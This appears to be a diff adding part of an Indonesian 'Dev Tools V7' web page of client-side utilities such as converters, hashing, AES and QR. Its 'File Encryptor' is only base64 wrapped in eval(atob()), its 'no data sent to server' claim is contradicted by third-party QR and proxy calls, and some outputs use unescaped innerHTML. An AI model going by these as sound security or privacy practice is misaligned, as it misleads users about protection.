+        <textarea id="caseOutput" readonly class="w-full h-24 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 11: UUID -->
+    <div id="content-uuid" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-purple font-semibold mb-4">UUID Generator v4</h3>
+        <input type="number" id="uuidCount" value="5" min="1" max="50" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="generateUUID()" class="py-2 bg-terminal-purple text-terminal-darker font-mono font-bold rounded">Generate</button>
+          <button onclick="clearTool('uuidOutput')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <textarea id="uuidOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 12: TIMESTAMP -->
+    <div id="content-time" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-yellow font-semibold mb-4">Timestamp Converter</h3>
+        <input type="text" id="timeInput" placeholder="1718198400 atau 2024-06-12" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="convertTime()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Convert</button>
+          <button onclick="clearTool('timeInput','timeOutput')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <div id="timeOutput" class="p-3 bg-terminal-darker rounded text-xs font-mono space-y-1"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 13: IMAGE TO BASE64 -->
+    <div id="content-imgb64" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-pink font-semibold mb-4">Image to Base64</h3>
+        <input type="file" id="imgFile" accept="image/*" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="imageToBase64()" class="py-2 bg-terminal-pink text-terminal-darker font-mono font-bold rounded">Convert</button>
+          <button onclick="clearTool('imgb64Output')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <textarea id="imgb64Output" readonly placeholder="Data URI muncul disini..." class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div id="imgPreview" class="flex justify-center"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 14: COLOR CONVERTER -->
+    <div id="content-color" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-cyan font-semibold mb-4">Color Converter HEX ↔ RGB ↔ HSL</h3>
+        <input type="text" id="colorInput" placeholder="#ff5500 atau rgb(255,85,0)" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="convertColor()" class="py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded">Convert</button>
+          <button onclick="clearTool('colorInput','colorOutput')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <div id="colorOutput" class="p-3 bg-terminal-darker rounded text-xs font-mono space-y-1"></div>
+        <div id="colorPreview" class="w-full h-16 rounded mt-3 border-terminal-border"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 15: QR -->
+    <div id="content-qr" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-yellow font-semibold mb-4">QR Code Generator</h3>
+        <input type="text" id="qrInput" placeholder="Masukkan link/text..." class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <div class="grid grid-cols-2 gap-2 mb-4">
+          <button onclick="generateQR()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Generate QR</button>
+          <button onclick="clearTool('qrInput','qrResult')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <div id="qrResult" class="flex justify-center"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 16: YOUTUBE METADATA -->
+    <div id="content-ytmeta" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-red font-semibold mb-4">▶️ YouTube Info Extractor</h3>
+        <p class="text-xs text-terminal-comment mb-3">Ambil title, thumbnail, channel via API resmi YouTube oEmbed.</p>
+        <div class="flex gap-2 mb-3">
+          <input type="text" id="ytUrl" placeholder="https://youtube.com/watch?v=..." class="flex-1 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono">
+          <button onclick="clearTool('ytUrl','ytResult')" class="px-4 py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded text-xs">🗑️ Clear</button>
+        </div>
+        <button onclick="getYTInfo()" id="ytBtn" class="w-full py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded mb-3">Get Info</button>
+        <div id="ytResult" class="hidden p-4 bg-terminal-darker rounded">
+          <img id="ytThumb" class="w-full max-w-xs mx-auto rounded mb-3">
+          <p id="ytTitle" class="text-sm text-terminal-text mb-1 font-bold"></p>
+          <p id="ytChannel" class="text-xs text-terminal-comment mb-1"></p>
+          <p id="ytType" class="text-xs text-terminal-comment"></p>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOOL 17: JSON TO CSV -->
+    <div id="content-jsontocsv" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-green font-semibold mb-4">📊 JSON → CSV Converter</h3>
+        <textarea id="jsonCsvInput" placeholder='[{"name":"Asep","age":20}]' class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="jsonToCsv()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded">Convert</button>
+          <button onclick="clearTool('jsonCsvInput','jsonCsvOutput')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <textarea id="jsonCsvOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 18: CSV TO JSON -->
+    <div id="content-csvtojson" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-yellow font-semibold mb-4">📊 CSV → JSON Converter</h3>
+        <textarea id="csvJsonInput" placeholder='name,age&#10;Asep,20' class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="csvToJson()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Convert</button>
+          <button onclick="clearTool('csvJsonInput','csvJsonOutput')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <textarea id="csvJsonOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 19: BASE64 IMAGE DOWNLOADER -->
+    <div id="content-b64imgdl" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-pink font-semibold mb-4">🖼️ Base64 Image Downloader</h3>
+        <textarea id="b64ImgInput" placeholder="data:image/png;base64,iVBORw0KGgo..." class="w-full h-24 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="downloadB64Image()" class="py-2 bg-terminal-pink text-terminal-darker font-mono font-bold rounded">Download Image</button>
+          <button onclick="clearTool('b64ImgInput','b64ImgPreview')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <div id="b64ImgPreview" class="flex justify-center"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 20: COLOR PALETTE -->
+    <div id="content-palette" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-cyan font-semibold mb-4">🎨 Color Palette Generator</h3>
+        <input type="color" id="paletteColor" value="#ff5500" class="w-full h-12 mb-3 rounded">
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="generatePalette()" class="py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded">Generate 5 Colors</button>
+          <button onclick="clearTool('paletteResult')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <div id="paletteResult" class="grid grid-cols-5 gap-2"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 21: ABOUT -->
+    <div id="content-about" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-green font-semibold mb-4">ℹ️ About Dev Tools V7</h3>
+        <div class="space-y-4 text-sm">
+          <div class="p-4 bg-terminal-darker rounded border-terminal-border">
+            <p class="font-mono text-terminal-cyan mb-2">Built by: Asepp ⚡ Kelpin</p>
+            <p class="text-terminal-comment">21-in-1 dev tools. 100% client-side, no data sent to server.</p>
+          </div>
+          <div class="grid grid-cols-2 gap-3">
+            <div class="p-3 bg-terminal-darker rounded text-center">
+              <p class="text-2xl font-mono text-terminal-green">21</p>
+              <p class="text-xs text-terminal-comment">Tools Available</p>
+            </div>
+            <div class="p-3 bg-terminal-darker rounded text-center">
+              <p class="text-2xl font-mono text-terminal-cyan" id="statUses">0</p>
+              <p class="text-xs text-terminal-comment">Actions This Session</p>
+            </div>
+          </div>
+          <button onclick="resetStats()" class="w-full py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Reset Stats</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOOL 22: TIKTOK PREVIEW -->
+    <div id="content-tiktok" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-cyan font-semibold mb-4">🎵 TikTok Video Preview (Official oEmbed)</h3>
+        <p class="text-xs text-terminal-comment mb-3">Ambil title & thumbnail via endpoint resmi TikTok.</p>
+        <div class="flex gap-2 mb-3">
+          <input type="text" id="ttUrl" placeholder="https://www.tiktok.com/@user/video/..." class="flex-1 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono">
+          <button onclick="clearTool('ttUrl','ttResult')" class="px-4 py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded text-xs">🗑️</button>
+        </div>
+        <button onclick="getTikTokPreview()" class="w-full py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded mb-3">Get Preview</button>
+        <div id="ttResult" class="hidden p-4 bg-terminal-darker rounded text-center">
+          <img id="ttThumb" class="w-full max-w-xs mx-auto rounded mb-3">
+          <p id="ttTitle" class="text-sm text-terminal-text mb-1 font-bold"></p>
+          <p id="ttAuthor" class="text-xs text-terminal-comment mb-2"></p>
+          <a id="ttOpen" target="_blank" class="inline-block px-4 py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-sm">🔗 Open in TikTok</a>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<div class="pagination">
+  <button class="pagination-btn" onclick="switchPage(1)">1</button>
+  <button class="pagination-btn active" onclick="switchPage(2)">2</button>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<script>
+let currentFile = null;
+let currentFileName = 'file.js';
+let sessionUses = 0;
+
+document.addEventListener('DOMContentLoaded', () => {
+  const obfDrop = document.getElementById('obfDrop');
+  const obfFile = document.getElementById('obfFile');
+  obfDrop?.addEventListener('click', () => obfFile.click());
+  obfDrop?.addEventListener('dragover', e => { e.preventDefault(); obfDrop.classList.add('dragging'); });
+  obfDrop?.addEventListener('dragleave', () => obfDrop.classList.remove('dragging'));
+  obfDrop?.addEventListener('drop', e => {
+    e.preventDefault(); obfDrop.classList.remove('dragging');
+    if(e.dataTransfer.files.length) handleFile(e.dataTransfer.files[0]);
+  });
+  obfFile?.addEventListener('change', e => {
+    if(e.target.files.length) handleFile(e.target.files[0]);
+  });
+  document.getElementById('imgFile')?.addEventListener('change', e => {
+    if(e.target.files.length) imageToBase64();
+  });
+  document.getElementById('b64File')?.addEventListener('change', e => {
+    if(e.target.files.length) {
+      const reader = new FileReader();
+      reader.onload = ev => document.getElementById('b64Input').value = ev.target.result;
+      reader.readAsText(e.target.files[0]);
+    }
+  });
+});
+
+function switchPage(pageNum) {
+  document.querySelectorAll('.page').forEach(p => {
+    p.classList.remove('active');
+  });
+
+  document.querySelectorAll('.pagination-btn').forEach(b => b.classList.remove('active'));
+
+  const activePage = document.getElementById('page' + pageNum);
+  activePage.classList.add('active');
+
+  document.querySelectorAll('.pagination-btn')[pageNum - 1].classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function switchTool(tool) {
+  // Reset semua tab
+  document.querySelectorAll('.tool-tab').forEach(t => {
+    t.classList.remove('active', 'bg-terminal-cyan', 'text-terminal-darker');
+    t.classList.add('bg-terminal-darker', 'text-terminal-comment');
+  });
+
+  // Hide semua konten
+  document.querySelectorAll('.tool-content').forEach(c => {
+    c.classList.remove('active');
+  });
+
+  // Aktifin tab & konten yang dipilih
+  const activeTab = document.getElementById('tool-' + tool);
+  const activeContent = document.getElementById('content-' + tool);
+
+  if(activeTab && activeContent) {
+    activeTab.classList.add('active', 'bg-terminal-cyan', 'text-terminal-darker');
+    activeTab.classList.remove('bg-terminal-darker', 'text-terminal-comment');
+    activeContent.classList.add('active');
+  }
+}
+
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  toast.textContent = msg;
+  toast.classList.remove('opacity-0', 'pointer-events-none');
+  setTimeout(() => toast.classList.add('opacity-0', 'pointer-events-none'), 2000);
+}
+
+function trackUse() {
+  sessionUses++;
+  document.getElementById('statUses').textContent = sessionUses;
+}
+
+function clearTool(...ids) {
+  ids.forEach(id => {
+    const el = document.getElementById(id);
+    if(!el) return;
+    if(el.tagName === 'TEXTAREA' || el.tagName === 'INPUT') el.value = '';
+    if(el.tagName === 'DIV' || el.tagName === 'PRE') el.innerHTML = '';
+    if(el.classList.contains('hidden') === false) el.classList.add('hidden');
+  });
+  showToast('Cleared!');
+}
+
+function copyResult(id) {
+  const el = document.getElementById(id);
+  if(!el.value) return showToast('Nothing to copy!');
+  navigator.clipboard.writeText(el.value);
+  trackUse();
+  showToast('Copied!');
+}
+
+function downloadResult(id, filename) {
+  const el = document.getElementById(id);
+  if(!el.value) return showToast('Nothing to download!');
+  const blob = new Blob([el.value], {type: 'text/plain'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  a.click();
+  URL.revokeObjectURL(url);
+  trackUse();
+  showToast('Downloaded!');
+}
+
+// FILE HANDLER
+function handleFile(file) {
+  if(file.size > 5 * 1024 * 1024) return showToast('File terlalu besar! Max 5MB');
+  currentFile = file;
+  currentFileName = file.name;
+  const reader = new FileReader();
+  reader.onload = e => {
+    document.getElementById('obfInput').value = e.target.result;
+    document.getElementById('obfDropText').innerHTML = `<p class="text-terminal-green font-mono text-sm">✅ ${file.name} loaded</p>`;
+    document.getElementById('obfStats').textContent = `${e.target.result.length} chars`;
+    trackUse();
+  };
+  reader.readAsText(file);
+}
+
+// FILE ENCRYPTOR
+function encryptFile() {
+  if(!currentFile) return showToast('Upload file dulu bro!');
+  const input = document.getElementById('obfInput').value;
+  try {
+    const encoded = btoa(unescape(encodeURIComponent(input)));
+    const wrap = `// Encrypted by Dev Tools V7\nconst _0x = "${encoded}";\neval(atob(_0x));`;
+    document.getElementById('obfOutput').value = wrap;
+    trackUse();
+    showToast('File encrypted!');
+  } catch(e) {
+    showToast('Error: ' + e.message);
+  }
+}
+
+function decryptFile() {
+  const input = document.getElementById('obfOutput').value;
+  if(!input) return showToast('Encrypt dulu!');
+  try {
+    const match = input.match(/const _0x = "([^"]+)"/);
+    if(!match) return showToast('Bukan format encrypt!');
+    const decoded = decodeURIComponent(escape(atob(match[1])));
+    document.getElementById('obfInput').value = decoded;
+    trackUse();
+    showToast('Decrypted!');
+  } catch(e) {
+    showToast('Gagal decrypt!');
+  }
+}
+
+function downloadEncrypted() {
+  const output = document.getElementById('obfOutput').value;
+  if(!output) return showToast('Encrypt dulu!');
+  const blob = new Blob([output], {type: 'text/javascript'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = currentFileName.replace('.js', '.enc.js');
+  a.click();
+  URL.revokeObjectURL(url);
+  trackUse();
+  showToast('Downloaded!');
+}
+
+// BASE64 TEXT
+function base64EncodeUnicode(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
+function base64DecodeUnicode(str) {
+  return decodeURIComponent(escape(atob(str)));
+}
+
+function encodeB64() {
+  const input = document.getElementById('b64Input').value;
+  if(!input) return showToast('Masukkan text dulu!');
+  document.getElementById('b64Output').value = base64EncodeUnicode(input);
+  trackUse();
+}
+function decodeB64() {
+  try {
+    const input = document.getElementById('b64Input').value;
+    if(!input) return showToast('Masukkan text dulu!');
+    document.getElementById('b64Output').value = base64DecodeUnicode(input);
+    trackUse();
+  } catch(e) {
+    showToast('Base64 tidak valid!');
+  }
+}
+
+// JSON
+function formatJSON() {
+  try {
+    const input = document.getElementById('jsonInput').value;
+    document.getElementById('jsonOutput').value = JSON.stringify(JSON.parse(input), null, 2);
+    trackUse();
+    showToast('Formatted!');
+  } catch(e) {
+    showToast('Invalid JSON!');
+  }
+}
+function minifyJSON() {
+  try {
+    const input = document.getElementById('jsonInput').value;
+    document.getElementById('jsonOutput').value = JSON.stringify(JSON.parse(input));
+    trackUse();
+    showToast('Minified!');
+  } catch(e) {
+    showToast('Invalid JSON!');
+  }
+}
+function validateJSON() {
+  try {
+    JSON.parse(document.getElementById('jsonInput').value);
+    document.getElementById('jsonOutput').value = '✅ Valid JSON!';
+    trackUse();
+  } catch(e) {
+    document.getElementById('jsonOutput').value = '❌ Invalid: ' + e.message;
+  }
+}
+
+// AES
+function aesEncrypt() {
+  const key = document.getElementById('aesKey').value;
+  const text = document.getElementById('aesInput').value;
+  if(!key ||!text) return showToast('Isi key dan text!');
+  const encrypted = CryptoJS.AES.encrypt(text, key).toString();
+  document.getElementById('aesOutput').value = encrypted;
+  trackUse();
+  showToast('Encrypted!');
+}
+function aesDecrypt() {
+  const key = document.getElementById('aesKey').value;
+  const text = document.getElementById('aesInput').value;
+  if(!key ||!text) return showToast('Isi key dan text!');
+  try {
+    const decrypted = CryptoJS.AES.decrypt(text, key).toString(CryptoJS.enc.Utf8);
+    document.getElementById('aesOutput').value = decrypted;
+    trackUse();
+    showToast('Decrypted!');
+  } catch(e) {
+    showToast('Wrong key or invalid data!');
+  }
+}
+
+// HASH
+function generateHash() {
+  const text = document.getElementById('hashInput').value;
+  if(!text) return showToast('Masukkan text!');
+  document.getElementById('md5Out').textContent = CryptoJS.MD5(text).toString();
+  document.getElementById('sha256Out').textContent = CryptoJS.SHA256(text).toString();
+  document.getElementById('sha512Out').textContent = CryptoJS.SHA512(text).toString();
+  trackUse();
+  showToast('Hash generated!');
+}
+
+// DIFF
+function compareDiff() {
+  const t1 = document.getElementById('diff1').value.split('\n');
+  const t2 = document.getElementById('diff2').value.split('\n');
+  let result = '';
+  const maxLen = Math.max(t1.length, t2.length);
+  for(let i=0; i<maxLen; i++) {
+    if(t1[i]!== t2[i]) {
+      result += `<span class="text-terminal-red">- ${t1[i] || ''}</span>\n`;
+      result += `<span class="text-terminal-green">+ ${t2[i] || ''}</span>\n`;
+    } else {
+      result += ` ${t1[i] || ''}\n`;
+    }
+  }
+  document.getElementById('diffOut').innerHTML = result;
+  trackUse();
+}
+
+// REGEX
+function testRegex() {
+  try {
+    const pattern = document.getElementById('regexPattern').value;
+    const flags = document.getElementById('regexFlags').value;
+    const test = document.getElementById('regexTest').value;
+    const regex = new RegExp(pattern, flags);
+    const matches = test.match(regex);
+    document.getElementById('regexResult').innerHTML = matches?
+      `<span class="text-terminal-green">Match found:</span>\n${matches.join('\n')}` :
+      '<span class="text-terminal-red">No match</span>';
+    trackUse();
+  } catch(e) {
+    document.getElementById('regexResult').innerHTML = `<span class="text-terminal-red">Error: ${e.message}</span>`;
+  }
+}
+
+// URL
+function encodeURL() {
+  document.getElementById('urlOutput').value = encodeURIComponent(document.getElementById('urlInput').value);
+  trackUse();
+}
+function decodeURL() {
+  document.getElementById('urlOutput').value = decodeURIComponent(document.getElementById('urlInput').value);
+  trackUse();
+}
+
+// HTML
+function escapeHTML() {
+  const text = document.getElementById('htmlInput').value;
+  document.getElementById('htmlOutput').value = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+  trackUse();
+}
+function unescapeHTML() {
+  const text = document.getElementById('htmlInput').value;
+  document.getElementById('htmlOutput').value = text.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/&quot;/g, '"');
+  trackUse();
+}
+
+// CASE CONVERTER
+function toUpperCase() { document.getElementById('caseOutput').value = document.getElementById('caseInput').value.toUpperCase(); trackUse(); }
+function toLowerCase() { document.getElementById('caseOutput').value = document.getElementById('caseInput').value.toLowerCase(); trackUse(); }
+function toTitleCase() { document.getElementById('caseOutput').value = document.getElementById('caseInput').value.replace(/\w\S*/g, w => w[0].toUpperCase() + w.substr(1).toLowerCase()); trackUse(); }
+function toCamelCase() { document.getElementById('caseOutput').value = document.getElementById('caseInput').value.replace(/(?:^\w|[A-Z]|\b\w)/g, (w, i) => i === 0? w.toLowerCase() : w.toUpperCase()).replace(/\s+/g, ''); trackUse(); }
+function toSnakeCase() { document.getElementById('caseOutput').value = document.getElementById('caseInput').value.toLowerCase().replace(/\s+/g, '_'); trackUse(); }
+function toKebabCase() { document.getElementById('caseOutput').value = document.getElementById('caseInput').value.toLowerCase().replace(/\s+/g, '-'); trackUse(); }
+
+// UUID
+function generateUUID() {
+  const count = parseInt(document.getElementById('uuidCount').value);
+  let result = '';
+  for(let i=0; i<count; i++) {
+    result += crypto.randomUUID() + '\n';
+  }
+  document.getElementById('uuidOutput').value = result;
+  trackUse();
+}
+
+// TIMESTAMP
+function convertTime() {
+  const input = document.getElementById('timeInput').value;
+  let date;
+  if(/^\d+$/.test(input)) {
+    date = new Date(parseInt(input) * (input.length === 10? 1000 : 1));
+  } else {
+    date = new Date(input);
+  }
+  if(isNaN(date)) return showToast('Invalid date!');
+  document.getElementById('timeOutput').innerHTML = `
+    <p>Unix Timestamp: ${Math.floor(date.getTime()/1000)}</p>
+    <p>ISO String: ${date.toISOString()}</p>
+    <p>Local: ${date.toLocaleString()}</p>
+  `;
+  trackUse();
+}
+
+// IMAGE TO BASE64
+function imageToBase64() {
+  const file = document.getElementById('imgFile').files[0];
+  if(!file) return showToast('Pilih gambar dulu!');
+  const reader = new FileReader();
+  reader.onload = e => {
+    document.getElementById('imgb64Output').value = e.target.result;
+    document.getElementById('imgPreview').innerHTML = `<img src="${e.target.result}" class="max-w-xs rounded">`;
+    trackUse();
+  };
+  reader.readAsDataURL(file);
+}
+
+// COLOR CONVERTER
+function convertColor() {
+  const input = document.getElementById('colorInput').value.trim();
+  let r,g,b;
+  if(input.startsWith('#')) {
+    const hex = input.replace('#', '');
+    r = parseInt(hex.substr(0,2), 16);
+    g = parseInt(hex.substr(2,2), 16);
+    b = parseInt(hex.substr(4,2), 16);
+  } else if(input.startsWith('rgb')) {
+    [r,g,b] = input.match(/\d+/g).map(Number);
+  }
+  if(r === undefined) return showToast('Format salah!');
+  const hex = `#${r.toString(16).padStart(2,'0')}${g.toString(16).padStart(2,'0')}${b.toString(16).padStart(2,'0')}`;
+  const hsl = rgbToHsl(r,g,b);
+  document.getElementById('colorOutput').innerHTML = `
+    <p>HEX: ${hex}</p>
+    <p>RGB: rgb(${r}, ${g}, ${b})</p>
+    <p>HSL: hsl(${hsl.h}, ${hsl.s}%, ${hsl.l}%)</p>
+  `;
+  document.getElementById('colorPreview').style.backgroundColor = hex;
+  trackUse();
+}
+function rgbToHsl(r,g,b) {
+  r /= 255; g /= 255; b /= 255;
+  const max = Math.max(r,g,b), min = Math.min(r,g,b);
+  let h=0,s=0,l=(max+min)/2;
+  if(max!== min) {
+    const d = max - min;
+    s = l > 0.5? d/(2-max-min) : d/(max+min);
+    switch(max) {
+      case r: h = (g-b)/d + (g<b?6:0); break;
+      case g: h = (b-r)/d + 2; break;
+      case b: h = (r-g)/d + 4; break;
+    }
+    h /= 6;
+  }
+  return {h: Math.round(h*360), s: Math.round(s*100), l: Math.round(l*100)};
+}
+
+// QR CODE
+function generateQR() {
+  const text = document.getElementById('qrInput').value;
+  if(!text) return showToast('Masukkan text!');
+  document.getElementById('qrResult').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(text)}" class="rounded">`;
+  trackUse();
+}
+
+// YOUTUBE METADATA
+async function getYTInfo() {
+  const url = document.getElementById('ytUrl').value.trim();
+  if(!url) return showToast('Masukkan link YouTube!');
+  const btn = document.getElementById('ytBtn');
+  btn.disabled = true; btn.textContent = 'Loading...';
+  try {
+    const res = await fetch(`https://www.youtube.com/oembed?url=${encodeURIComponent(url)}&format=json`);
+    if(!res.ok) throw new Error('Link tidak valid');
+    const data = await res.json();
+    document.getElementById('ytResult').classList.remove('hidden');
+    document.getElementById('ytThumb').src = data.thumbnail_url;
+    document.getElementById('ytTitle').textContent = data.title;
+    document.getElementById('ytChannel').textContent = 'Channel: ' + data.author_name;
+    document.getElementById('ytType').textContent = 'Type: ' + data.type;
+    trackUse(); showToast('Info loaded!');
+  } catch(e) {
+    showToast('Error: ' + e.message);
+  } finally {
+    btn.disabled = false; btn.textContent = 'Get Info';
+  }
+}
+
+// JSON TO CSV
+function jsonToCsv() {
+  try {
+    const json = JSON.parse(document.getElementById('jsonCsvInput').value);
+    if(!Array.isArray(json)) throw new Error('JSON harus array of objects');
+    const keys = Object.keys(json[0]);
+    const csv = [keys.join(','),...json.map(r => keys.map(k => `"${r[k]}"`).join(','))].join('\n');
+    document.getElementById('jsonCsvOutput').value = csv;
+    trackUse(); showToast('Converted!');
+  } catch(e) {
+    showToast('Error: ' + e.message);
+  }
+}
+
+// CSV TO JSON
+function csvToJson() {
+  try {
+    const csv = document.getElementById('csvJsonInput').value.trim().split('\n');
+    const keys = csv[0].split(',');
+    const json = csv.slice(1).map(row => {
+      const vals = row.split(',');
+      let obj = {};
+      keys.forEach((k,i) => obj[k] = vals[i]);
+      return obj;
+    });
+    document.getElementById('csvJsonOutput').value = JSON.stringify(json, null, 2);
+    trackUse(); showToast('Converted!');
+  } catch(e) {
+    showToast('Error: ' + e.message);
+  }
+}
+// TIKTOK PREVIEW
+async function getTikTokPreview() {
+  const url = document.getElementById("ttUrl").value.trim();
+  if (!url) return showToast("Masukkan URL dulu!");
+  
+  if (!url.includes("tiktok.com")) return showToast("URL TikTok tidak valid!");
+
+  showToast("Fetching...");
+  const btn = document.querySelector("#content-tiktok button");
+  btn.disabled = true;
+  btn.textContent = "Loading...";
+
+  try {
+    const proxyUrl = "https://api.allorigins.win/raw?url=";
+    const apiUrl = `https://www.tiktok.com/oembed?url=${encodeURIComponent(url)}`;
+    
+    const res = await fetch(proxyUrl + encodeURIComponent(apiUrl));
+    
+    if (!res.ok) throw new Error("Gagal ambil data");
+
+    const data = await res.json();
+
+    document.getElementById("ttThumb").src = data.thumbnail_url;
+    document.getElementById("ttTitle").textContent = data.title || "No Title";
+    document.getElementById("ttAuthor").textContent = "By: " + (data.author_name || "-");
+    document.getElementById("ttOpen").href = url;
+
+    document.getElementById("ttResult").classList.remove("hidden");
+    trackUse();
+    showToast("Preview loaded!");
+    
+  } catch (err) {
+    console.error(err);
+    showToast("Gagal ambil data! Coba link lain");
+  } finally {
+    btn.disabled = false;
+    btn.textContent = "Get Preview";
+  }
+}
+// BASE64 IMAGE DOWNLOADER
+function downloadB64Image() {
+  const b64 = document.getElementById('b64ImgInput').value.trim();
+  if(!b64.startsWith('data:image')) return showToast('Bukan data URI valid!');
+  const a = document.createElement('a');
+  a.href = b64;
+  a.download = 'image.png';
+  a.click();
+  document.getElementById('b64ImgPreview').innerHTML = `<img src="${b64}" class="max-w-xs rounded">`;
+  trackUse(); showToast('Downloaded!');
+}
+
+// COLOR PALETTE
+function generatePalette() {
+  const hex = document.getElementById('paletteColor').value;
+  const colors = [hex];
+  for(let i=1;i<5;i++){
+    const r = parseInt(hex.substr(1,2),16);
+    const g = parseInt(hex.substr(3,2),16);
+    const b = parseInt(hex.substr(5,2),16);
+    const shift = i*30;
+    const nr = Math.min(255,(r+shift)%255);
+    const ng = Math.min(255,(g+shift*2)%255);
+    const nb = Math.min(255,(b+shift*3)%255);
+    colors.push(`#${nr.toString(16).padStart(2,'0')}${ng.toString(16).padStart(2,'0')}${nb.toString(16).padStart(2,'0')}`);
+  }
+  document.getElementById('paletteResult').innerHTML = colors.map(c =>
+    `<div onclick="navigator.clipboard.writeText('${c}')" class="h-16 rounded cursor-pointer border-terminal-border" style="background:${c}" title="${c}"></div>`
+  ).join('');
+  trackUse(); showToast('Palette generated! Click color to copy');
+}
+
+function resetStats() {
+  sessionUses = 0;
+  document.getElementById('statUses').textContent = 0;
+  showToast('Stats reset!');
+}
+</script>
+</body>
+    </html>
